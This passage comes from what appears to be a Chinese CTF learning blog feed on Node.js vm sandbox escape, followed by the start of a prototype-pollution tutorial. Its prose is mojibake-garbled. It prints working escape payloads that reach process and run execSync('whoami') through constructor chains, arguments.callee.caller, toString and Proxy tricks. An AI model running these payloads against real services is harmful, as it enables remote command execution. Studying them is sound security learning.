class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> util = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;util&#x27;</span>);<br><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);<br><span class="hljs-keyword">const</span> sandbox = &#123;<br><span class="hljs-attr">animal</span>: <span class="hljs-string">&#x27;cat&#x27;</span>,<br><span class="hljs-attr">count</span>: <span class="hljs-number">2</span><br>&#125;;<br><span class="hljs-keyword">const</span> script = <span class="hljs-keyword">new</span> vm.<span class="hljs-title class_">Script</span>(<span class="hljs-string">&#x27;count += 1; name = &quot;kitty&quot;;&#x27;</span>);<br><span class="hljs-keyword">const</span> context = vm.<span class="hljs-title function_">createContext</span>(sandbox);<br>script.<span class="hljs-title function_">runInContext</span>(context);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(util.<span class="hljs-title function_">inspect</span>(sandbox));<br><span class="hljs-comment">// &#123; animal: &#x27;cat&#x27;, count: 3, name: &#x27;kitty&#x27; &#125;</span><br></code></pre></td></tr></table></figure><p>scriptå¯¹è±¡å¯ä»¥é€šè¿‡runInXXXContextè¿è¡Œã€‚</p><h3 id="0x03å¦‚ä½•é€ƒé€¸ï¼Ÿ"><a href="#0x03å¦‚ä½•é€ƒé€¸ï¼Ÿ" class="headerlink" title="0x03å¦‚ä½•é€ƒé€¸ï¼Ÿ"></a>0x03å¦‚ä½•é€ƒé€¸ï¼Ÿ</h3><p>nodeæ‰§è¡Œ<code>RCE</code>éœ€è¦å¼•å…¥<code>process</code>å¯¹è±¡è¿›è€Œå¯¼å…¥<code>child_process</code>æ¨¡å—æ¥æ‰§è¡Œå‘½ä»¤ã€‚ç„¶è€Œï¼Œ<code>process</code>æ˜¯æŒ‚è½½åˆ°globalä¸Šçš„ã€‚å‰é¢çš„ä¾‹å­ä¹Ÿè¯´æ˜äº†åœ¨æ²™ç®±ä¸­è²Œä¼¼ä¸èƒ½è®¿é—®åˆ°<code>global</code>ï¼Œé‚£ä¹ˆè¯¥å¦‚ä½•é€ƒé€¸ï¼Ÿå¦‚ä½•æ‹¿åˆ°<code>process</code>ï¼Ÿ</p><p>vmæ¨¡å—æ˜¯éå¸¸ä¸ä¸¥è°¨çš„ï¼ŒåŸºäºnodeåŸå‹é“¾ç»§æ‰¿çš„ç‰¹æ€§ï¼Œæˆ‘ä»¬å¾ˆå®¹æ˜“å°±èƒ½æ‹¿åˆ°å¤–éƒ¨å…¨å±€å˜é‡ã€‚æ¯”å¦‚ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-meta">&quot;use strict&quot;</span>;<span class="hljs-comment">//ä¸¥æ ¼æ¨¡å¼</span><br><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm&quot;</span>);<br><span class="hljs-keyword">const</span> a = vm.<span class="hljs-title function_">runInNewContext</span>(<span class="hljs-string">`this.constructor.constructor(&#x27;return global&#x27;)()`</span>);<span class="hljs-comment">//è·å–å…¨å±€å¯¹è±¡ global</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a.<span class="hljs-property">process</span>);<br><span class="hljs-comment">//codeå‚æ•°æœ€å¥½ç”¨åå¼•å·åŒ…è£¹ï¼Œè¿™æ ·å¯ä»¥ä½¿codeæ›´ä¸¥æ ¼ä¾¿äºæ‰§è¡Œ</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">    this.constructorï¼šè·å–å½“å‰æ‰§è¡Œä¸Šä¸‹æ–‡çš„æ„é€ å‡½æ•°ã€‚</span><br><span class="hljs-comment">    this.constructor.constructorï¼šè·å–æ„é€ å‡½æ•°çš„æ„é€ å‡½æ•°ï¼Œå³åŸå§‹çš„ Function æ„é€ å‡½æ•°ã€‚</span><br><span class="hljs-comment">    this.constructor.constructor(&#x27;return global&#x27;)()ï¼šé€šè¿‡è°ƒç”¨åŸå§‹çš„ Function æ„é€ å‡½æ•°ï¼Œæ‰§è¡Œå­—ç¬¦ä¸² &#x27;return global&#x27;ï¼Œä»è€Œè·å–å…¨å±€å¯¹è±¡ globalã€‚</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>ç»“æœï¼š</p><p><img src="/img/vvv4.png" alt="vvv4"></p><p>è¿™é‡Œçš„<code>this</code>æ˜¯æŒ‡å‘ä¼ é€’åˆ°<code>runInNewContext</code>å‡½æ•°çš„ä¸€ä¸ªå¯¹è±¡ï¼Œä»–æ˜¯<strong>ä¸å±äºæ²™ç®±å†…éƒ¨ç¯å¢ƒ</strong>çš„ï¼Œè®¿é—®å½“å‰å¯¹è±¡çš„æ„é€ å™¨çš„æ„é€ å™¨ï¼Œä¹Ÿå°±æ˜¯Functionçš„æ„é€ å™¨ï¼Œç”±äºç»§æ‰¿å…³ç³»ï¼Œå®ƒçš„ä½œç”¨åŸŸæ˜¯å…¨å±€å˜é‡ï¼Œæ‰§è¡Œä»£ç ï¼Œè·å–å¤–éƒ¨globalã€‚æ‹¿åˆ°processå¯¹è±¡å°±å¯ä»¥æ‰§è¡Œå‘½ä»¤äº†ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-meta">&quot;use strict&quot;</span>;<br><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm&quot;</span>);<br><span class="hljs-keyword">const</span> a = vm.<span class="hljs-title function_">runInNewContext</span>(<span class="hljs-string">`this.constructor.constructor(&#x27;return process&#x27;)()`</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a.<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-title function_">execSync</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>).<span class="hljs-title function_">toString</span>());<span class="hljs-comment">//é€šè¿‡ a å¯¹è±¡ä¸­çš„ mainModule å±æ€§ï¼Œè·å–å½“å‰è¿›ç¨‹çš„ä¸»æ¨¡å—å¯¹è±¡ï¼Œç„¶åä½¿ç”¨ require æ–¹æ³•åŠ è½½ child_process æ¨¡å—ï¼Œå¹¶è°ƒç”¨ execSync æ–¹æ³•æ‰§è¡Œå‘½ä»¤ whoamiï¼Œè·å–å½“å‰è¿›ç¨‹çš„ç”¨æˆ·åï¼Œå¹¶å°†å…¶è½¬æ¢ä¸ºå­—ç¬¦ä¸²åæ‰“å°å‡ºæ¥ã€‚</span><br><span class="hljs-comment">//ç»“æœï¼šv1per3\rdj</span><br></code></pre></td></tr></table></figure><p>ä¸€äº›å…¶å®ƒæƒ…å†µï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);<br><span class="hljs-keyword">const</span> script = <span class="hljs-string">`...`</span>;<br><span class="hljs-keyword">const</span> sandbox = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>);<span class="hljs-comment">//åˆ›å»ºä¸€ä¸ªç©ºå¯¹è±¡ sandboxï¼Œä½œä¸ºæ²™ç›’ç¯å¢ƒçš„ä¸Šä¸‹æ–‡å¯¹è±¡ã€‚è¿™é‡Œä½¿ç”¨ Object.create(null) åˆ›å»ºä¸€ä¸ªæ²¡æœ‰åŸå‹é“¾çš„çº¯å‡€å¯¹è±¡ï¼Œä»¥é¿å…è®¿é—®åˆ°åŸå§‹çš„å…¨å±€å¯¹è±¡(å®ƒä¸ä¼šç»§æ‰¿ä»»ä½•å±æ€§å’Œæ–¹æ³•)</span><br><span class="hljs-keyword">const</span> context = vm.<span class="hljs-title function_">createContext</span>(sandbox);<span class="hljs-comment">//vm.createContext æ–¹æ³•åˆ›å»ºä¸€ä¸ªæ²™ç›’ç¯å¢ƒçš„ä¸Šä¸‹æ–‡å¯¹è±¡ contextï¼Œå¹¶å°†ä¹‹å‰åˆ›å»ºçš„ sandbox å¯¹è±¡ä½œä¸ºå‚æ•°ä¼ å…¥</span><br><span class="hljs-keyword">const</span> res = vm.<span class="hljs-title function_">runInContext</span>(script, context);<span class="hljs-comment">//åœ¨æŒ‡å®šçš„æ²™ç›’ç¯å¢ƒä¸­æ‰§è¡Œ JavaScript ä»£ç ã€‚script æ˜¯ä¹‹å‰å®šä¹‰çš„ JavaScript ä»£ç å­—ç¬¦ä¸²ï¼Œcontext æ˜¯æ²™ç›’ç¯å¢ƒçš„ä¸Šä¸‹æ–‡å¯¹è±¡ã€‚æ‰§è¡Œç»“æœå°†è¢«èµ‹å€¼ç»™ res å˜é‡ã€‚</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Hello &#x27;</span> + res)<span class="hljs-comment">//æ‰“å°è¾“å‡ºå­—ç¬¦ä¸² &#x27;Hello &#x27; å’Œ res å˜é‡çš„å€¼ã€‚</span><br></code></pre></td></tr></table></figure><p>ç°åœ¨çš„thisä¸ºnullï¼Œå¹¶ä¸”ä¹Ÿæ²¡æœ‰å…¶ä»–å¯ä»¥å¼•ç”¨çš„å¯¹è±¡ï¼Œè¿™æ—¶å€™æƒ³è¦é€ƒé€¸è¦ç”¨åˆ°ä¸€ä¸ªå‡½æ•°ä¸­çš„å†…ç½®å¯¹è±¡çš„å±æ€§<code>arguments.callee.caller</code>ï¼Œå®ƒå¯ä»¥è¿”å›å‡½æ•°çš„è°ƒç”¨è€…ã€‚</p><p>æˆ‘ä»¬ä¸Šé¢æ¼”ç¤ºçš„æ²™ç®±é€ƒé€¸å…¶å®å°±æ˜¯æ‰¾åˆ°ä¸€ä¸ªæ²™ç®±å¤–çš„å¯¹è±¡ï¼Œå¹¶è°ƒç”¨å…¶ä¸­çš„æ–¹æ³•ï¼Œè¿™ç§æƒ…å†µä¸‹ä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Œæˆ‘ä»¬åªè¦åœ¨æ²™ç®±å†…å®šä¹‰ä¸€ä¸ªå‡½æ•°ï¼Œç„¶ååœ¨æ²™ç®±å¤–è°ƒç”¨è¿™ä¸ªå‡½æ•°ï¼Œé‚£ä¹ˆè¿™ä¸ªå‡½æ•°çš„<code>arguments.callee.caller</code>å°±ä¼šè¿”å›æ²™ç®±å¤–çš„ä¸€ä¸ªå¯¹è±¡ï¼Œæˆ‘ä»¬åœ¨æ²™ç®±å†…å°±å¯ä»¥è¿›è¡Œé€ƒé€¸äº†ã€‚</p><p>ä¸¾ä¸ªæ —å­ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);<br><span class="hljs-keyword">const</span> script = <br><span class="hljs-string">`(() =&gt; &#123;</span><br><span class="hljs-string">    const a = &#123;&#125; //åˆ›å»ºç©ºå¯¹è±¡a</span><br><span class="hljs-string">    a.toString = function () &#123;//å®šä¹‰äº†aä¸­çš„toStringæ–¹æ³•</span><br><span class="hljs-string">      const cc = arguments.callee.caller;//é€šè¿‡ arguments.callee.caller è·å–åˆ°è°ƒç”¨è¯¥æ–¹æ³•çš„å‡½æ•°çš„å¼•ç”¨,åœ¨ä¸‹é¢ä¸¤è¡Œä¸­ç”¨åˆ°</span><br><span class="hljs-string">      const p = (cc.constructor.constructor(&#x27;return process&#x27;))();</span><br><span class="hljs-string">      return p.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString()</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">    return a</span><br><span class="hljs-string">  &#125;)()`</span>;<br><br><span class="hljs-keyword">const</span> sandbox = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>);<br><span class="hljs-keyword">const</span> context = <span class="hljs-keyword">new</span> vm.<span class="hljs-title function_">createContext</span>(sandbox);<br><span class="hljs-keyword">const</span> res = vm.<span class="hljs-title function_">runInContext</span>(script, context);<span class="hljs-comment">//resæ˜¯ä¸€ä¸ªæ¶æ„å¯¹è±¡</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Hello &#x27;</span> + res)<span class="hljs-comment">//åœ¨è¿™é‡Œè°ƒç”¨äº†é‡å†™çš„toStringæ–¹æ³•</span><br><br><span class="hljs-comment">//Hello v1per3\rdj</span><br><span class="hljs-comment">//() =&gt; &#123; ... &#125; è¿™ç§å½¢å¼è¡¨ç¤ºä¸€ä¸ªæ²¡æœ‰å‚æ•°çš„ç®­å¤´å‡½æ•°ï¼Œç®­å¤´å‡½æ•°å¯ä»¥ç”¨æ¥å®šä¹‰åŒ¿åå‡½æ•°ï¼Œå®ƒçš„è¯­æ³•æ¯”ä¼ ç»Ÿçš„å‡½æ•°å®šä¹‰æ›´åŠ ç®€æ´ã€‚</span><br></code></pre></td></tr></table></figure><p>è§£é‡Šä¸‹è¿™ä¸ªæ–¹æ³•ï¼šå…ˆå¯¹<code>toString</code>æ–¹æ³•è¿›è¡Œäº†é‡å†™(é‡å†™ä¸æ”¹å˜æ–¹æ³•ä½•æ—¶è¢«è°ƒç”¨)ã€‚<code>console.log(&#39;Hello &#39; + res)</code>æ—¶(ä¸€ä¸ªå¯¹è±¡ä¸å­—ç¬¦ä¸²å‘ç”Ÿäº†<code>å…³ç³»</code>)ï¼Œå°±ä¼šè°ƒç”¨<code>toString</code>æ–¹æ³•ã€‚(æ„Ÿè§‰æœ‰ç‚¹åƒPHPä¸­çš„é­”æœ¯æ–¹æ³•)</p><p>åœ¨ <code>toString</code> æ–¹æ³•ä¸­ï¼Œé€šè¿‡ <code>arguments.callee.caller</code> è·å–åˆ°è°ƒç”¨<strong>è¯¥æ–¹æ³•çš„å‡½æ•°</strong>çš„å¼•ç”¨ï¼Œå¹¶åˆ©ç”¨è¯¥å¼•ç”¨è·å–åˆ° <code>process</code> å¯¹è±¡ï¼Œç„¶åä½¿ç”¨ <code>child_process</code> æ¨¡å—çš„ <code>execSync</code> æ–¹æ³•æ‰§è¡Œå‘½ä»¤ <code>whoami</code>ï¼Œå¹¶å°†ç»“æœè½¬æ¢ä¸ºå­—ç¬¦ä¸²è¿”å›ã€‚å®ç°äº†<code>RCE</code></p><p>å½“ç„¶ï¼Œæœ‰æ—¶å³ä½¿æˆ‘ä»¬é‡å†™äº†<code>toString</code>å‡½æ•°ï¼Œä½†æ²™ç®±å¤–å¹¶ä¸å­˜åœ¨å»è§¦å‘è¯¥å‡½æ•°çš„ç›¸å…³æ“ä½œæˆ–æ ¹æœ¬ä¸èƒ½é‡å†™å‡½æ•°ï¼Œè¿™æ—¶æˆ‘ä»¬å¯ä»¥ç”¨<code>Proxy</code>æ¥åŠ«æŒå±æ€§ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm&quot;</span>);<span class="hljs-comment">//å¯¼å…¥vmæ¨¡å—</span><br><br><span class="hljs-keyword">const</span> script = <br><span class="hljs-string">`</span><br><span class="hljs-string">(() =&gt;&#123; //</span><br><span class="hljs-string">    const a = new Proxy(&#123;&#125;, &#123; //ä»£ç†äº†ç©ºå¯¹è±¡å¹¶å¯¹getæ–¹æ³•è¿›è¡Œé‡å†™ï¼Œä»£ç†å¯¹è±¡æ˜¯æŒ‡é€šè¿‡ä½¿ç”¨ES6ä¸­çš„Proxyå¯¹è±¡æ¥åŒ…è£…å¦ä¸€ä¸ªå¯¹è±¡ï¼Œä»è€Œå¯ä»¥æ‹¦æˆªå¹¶é‡å®šä¹‰è¯¥å¯¹è±¡çš„åŸºæœ¬æ“ä½œï¼ˆæ¯”å¦‚å±æ€§æŸ¥æ‰¾ã€èµ‹å€¼ã€åˆ é™¤ç­‰ï¼‰ã€‚ä»£ç†å¯¹è±¡å…è®¸æˆ‘ä»¬åœ¨å¯¹ç›®æ ‡å¯¹è±¡è¿›è¡Œæ“ä½œæ—¶ï¼Œå¯ä»¥è‡ªå®šä¹‰å¹¶æ·»åŠ é¢å¤–çš„è¡Œä¸ºã€‚</span><br><span class="hljs-string">        get: function()&#123;</span><br><span class="hljs-string">            const cc = arguments.callee.caller;</span><br><span class="hljs-string">            const p = (cc.constructor.constructor(&#x27;return process&#x27;))();</span><br><span class="hljs-string">            return p.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString();</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string">    &#125;)</span><br><span class="hljs-string">    return a</span><br><span class="hljs-string">&#125;)()//è¿™ä¸ª()ä¸ºäº†è°ƒç”¨åŒ¿åå‡½æ•°</span><br><span class="hljs-string">`</span>;<br><span class="hljs-keyword">const</span> sandbox = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>);<br><span class="hljs-keyword">const</span> context = <span class="hljs-keyword">new</span> vm.<span class="hljs-title function_">createContext</span>(sandbox);<br><span class="hljs-keyword">const</span> res = vm.<span class="hljs-title function_">runInContext</span>(script, context);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(res.<span class="hljs-property">abc</span>)<br></code></pre></td></tr></table></figure><p>å‚è€ƒæ–‡ç« ï¼š</p><p><code>https://xz.aliyun.com/t/11859</code></p><p><code>https://blog.csdn.net/m0_62422842/article/details/128553953</code></p><p><code>[Proxy å’Œ Reflect - æ˜é‡‘ (juejin.cn)](https://juejin.cn/post/6844904090116292616)</code></p>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>åˆè¯†JavaScriptåŸå‹é“¾æ±¡æŸ“</title>
    <link href="/2023/10/22/2023-10-22-JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2023/10/22/2023-10-22-JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>0xGameç¢°åˆ°äº†åŸå‹é“¾æ±¡æŸ“çš„é¢˜ï¼Œè®°å½•ä¸€ä¸‹å­¦ä¹ è¿‡ç¨‹</p><span id="more"></span><hr><p>å› ä¸ºç¬¬ä¸€æ¬¡æ¥è§¦ï¼Œæ‰€ä»¥å…ˆäº†è§£äº†<code>Javascript</code>è¿™ä¸œè¥¿çš„ç‰¹æ€§ï¼Œå…ˆçœ‹ä¸€æ®µç®€å•çš„æ„é€ ç±»çš„æ–¹æ³•ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params"></span>)&#123; <span class="hljs-comment">//åä¸ºpersonçš„æ„é€ å‡½æ•°ï¼Œæ„é€ å‡½æ•°ç”¨äºåˆ›å»ºæ‹¥æœ‰ç‰¹å®šå±æ€§/æ–¹æ³•çš„å¯¹è±¡</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>=<span class="hljs-string">&quot;rendongjun&quot;</span>;<span class="hljs-comment">//nameå±æ€§</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">test</span>=<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123; <span class="hljs-comment">//testæ–¹æ³•ï¼Œè¿”å› 333</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">333</span>;<br><br>&#125;<br>&#125;<br><span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">a</span>=<span class="hljs-number">3</span>;<span class="hljs-comment">//é€šè¿‡åŸå‹ç»§æ‰¿çš„æ–¹å¼ï¼Œç»™Personæ„é€ å‡½æ•°çš„åŸå‹å¯¹è±¡æ·»åŠ äº†ä¸€ä¸ªåä¸ºaçš„å±æ€§ï¼Œå…¶å€¼ä¸º3</span><br>web=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<span class="hljs-comment">//åˆ›å»ºåä¸ºwebçš„å¯¹è±¡ï¼Œè¯¥å¯¹è±¡æ˜¯é€šè¿‡personæ„é€ å‡½æ•°åˆ›å»ºçš„ä¸€ä¸ªå®ä¾‹ï¼Œæ„é€ å‡½æ•°ä½¿ç”¨newè°ƒç”¨</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(web.<span class="hljs-title function_">test</span>());<span class="hljs-comment">//ä½¿ç”¨consoleå‡½æ•°è¿›è¡Œæ‰“å°</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(web.<span class="hljs-property">a</span>)<br></code></pre></td></tr></table></figure><h6 id="ä»€ä¹ˆæ˜¯åŸå‹ç»§æ‰¿ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯åŸå‹ç»§æ‰¿ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯åŸå‹ç»§æ‰¿ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯åŸå‹ç»§æ‰¿ï¼Ÿ</h6><p>æ¯ä¸ªJavaScriptå¯¹è±¡éƒ½æœ‰ä¸€ä¸ªåŸå‹å¯¹è±¡ï¼Œå®ƒæ˜¯ä¸€ä¸ªæ™®é€šçš„å¯¹è±¡ï¼ŒåŒ…å«äº†ä¸€äº›å…±äº«çš„å±æ€§å’Œæ–¹æ³•ã€‚å½“æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªæ–°å¯¹è±¡æ—¶ï¼Œå®ƒä¼šè‡ªåŠ¨ç»§æ‰¿åŸå‹å¯¹è±¡çš„å±æ€§å’Œæ–¹æ³•ã€‚</p><p>åœ¨JavaScriptä¸­ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¿®æ”¹åŸå‹å¯¹è±¡æ¥å®ç°å±æ€§å’Œæ–¹æ³•çš„ç»§æ‰¿ã€‚</p><p><code>Person.prototype.a = 3</code>è¿™æ®µä»£ç å°±æ˜¯åœ¨<code>Person</code>æ„é€ å‡½æ•°çš„åŸå‹å¯¹è±¡ä¸Šæ·»åŠ äº†ä¸€ä¸ªåä¸º<code>a</code>çš„å±æ€§ï¼Œå…¶å€¼ä¸º3ã€‚è¿™æ„å‘³ç€é€šè¿‡<code>Person</code>æ„é€ å‡½æ•°åˆ›å»ºçš„æ‰€æœ‰å¯¹è±¡å®ä¾‹éƒ½ä¼šç»§æ‰¿è¿™ä¸ª<code>a</code>å±æ€§ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡å¯¹è±¡å®ä¾‹è®¿é—®å’Œä½¿ç”¨å®ƒã€‚</p><p>æ¢å¥è¯è¯´ï¼Œå½“æˆ‘ä»¬åˆ›å»ºä¸€ä¸ª<code>person</code>å¯¹è±¡å®ä¾‹ï¼Œæ¯”å¦‚<code>web = new person()</code>ï¼Œè¿™ä¸ªå®ä¾‹ä¼šç»§æ‰¿<code>person</code>æ„é€ å‡½æ•°çš„åŸå‹å¯¹è±¡ä¸Šçš„å±æ€§å’Œæ–¹æ³•ã€‚å› æ­¤ï¼Œ<code>web</code>å¯¹è±¡å¯ä»¥è®¿é—®å’Œä½¿ç”¨<code>a</code>å±æ€§ï¼Œå³<code>web.a</code>ä¼šè¿”å›3ã€‚</p><p><code>__proto__</code>å±æ€§æŒ‡å‘å®ƒçš„æ„é€ å‡½æ•°çš„<code>prototype</code>å±æ€§ã€‚</p><h6 id="ä»€ä¹ˆæ˜¯åŸå‹é“¾ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯åŸå‹é“¾ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯åŸå‹é“¾ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯åŸå‹é“¾ï¼Ÿ</h6><p>åŸå‹é“¾æ˜¯JavaScriptä¸­ä¸€ç§å¯¹è±¡ä¹‹é—´çš„å…³ç³»æ¨¡å‹ï¼Œå®ƒç”¨äºå®ç°å¯¹è±¡çš„ç»§æ‰¿å’Œå±æ€§æŸ¥æ‰¾ã€‚</p><p>åœ¨JavaScriptä¸­ï¼Œæ¯ä¸ªå¯¹è±¡éƒ½æœ‰ä¸€ä¸ªåŸå‹å¯¹è±¡ï¼ˆprototypeï¼‰ï¼ŒåŸå‹å¯¹è±¡ä¹Ÿæ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œå®ƒåŒ…å«äº†ä¸€äº›å…±äº«çš„å±æ€§å’Œæ–¹æ³•ã€‚å½“æˆ‘ä»¬è®¿é—®ä¸€ä¸ªå¯¹è±¡çš„å±æ€§æˆ–æ–¹æ³•æ—¶ï¼Œå¦‚æœè¯¥å¯¹è±¡æœ¬èº«æ²¡æœ‰è¿™ä¸ªå±æ€§æˆ–æ–¹æ³•ï¼ŒJavaScriptä¼šæ²¿ç€åŸå‹é“¾å‘ä¸ŠæŸ¥æ‰¾ï¼Œç›´åˆ°æ‰¾åˆ°è¯¥å±æ€§æˆ–æ–¹æ³•æˆ–è€…åˆ°è¾¾åŸå‹é“¾çš„é¡¶ç«¯ï¼ˆå³Object.prototypeï¼‰ã€‚</p><p>åŸå‹é“¾çš„å…³ç³»å¯ä»¥é€šè¿‡å¯¹è±¡çš„<code>__proto__</code>å±æ€§æ¥è¡¨ç¤ºã€‚æ¯ä¸ªå¯¹è±¡éƒ½æœ‰ä¸€ä¸ª<code>__proto__</code>å±æ€§ï¼Œå®ƒæŒ‡å‘è¯¥å¯¹è±¡çš„åŸå‹å¯¹è±¡ã€‚åŸå‹å¯¹è±¡ä¹Ÿæœ‰è‡ªå·±çš„åŸå‹å¯¹è±¡ï¼Œè¿™æ ·å°±å½¢æˆäº†ä¸€ä¸ªé“¾å¼ç»“æ„ï¼Œå³åŸå‹é“¾ã€‚</p><p><img src="/img/pol1.png" alt="pol1"></p><h3 id="constructor-NaN"><a href="#constructor-NaN" class="headerlink" title="constructor"></a>constructor</h3><p>æ¯ä¸ªå®ä¾‹å¯¹è±¡éƒ½æœ‰ä¸€ä¸ª <code>constructor</code> å±æ€§æŒ‡å‘å¯¹åº”çš„<strong>æ„é€ å‡½æ•°</strong>ï¼Œå³ç±»ã€‚æ‰€ä»¥ä»¥ä¸‹å‡ ç§å†™æ³•å…¶å®æ˜¯ç›¸ç­‰çš„ï¼Œéƒ½è¿”å› <code>Foo</code> ç±»çš„åŸå‹å¯¹è±¡ã€‚</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-type">Foo</span>.proto<span class="hljs-keyword">type</span><br><span class="hljs-title">foo</span>[<span class="hljs-string">&quot;__proto__&quot;</span>]<br><span class="hljs-title">foo</span>.__proto__<br><span class="hljs-title">foo</span>.constructor.proto<span class="hljs-keyword">type</span><br></code></pre></td></tr></table></figure><p>å¤§æ®µå¤§æ®µçš„æ–‡å­—æ€»æ˜¯è®©äººå¤´ç–¼ï¼Œå†™ä¸ªç®€å•ä»£ç ä½“ä¼šä¸€ä¸‹ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Foo</span>(<span class="hljs-params"></span>)&#123;&#125;;<br><span class="hljs-literal">undefined</span><br><span class="hljs-keyword">let</span> foo = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Foo</span>();<br><span class="hljs-literal">undefined</span><br><span class="hljs-title 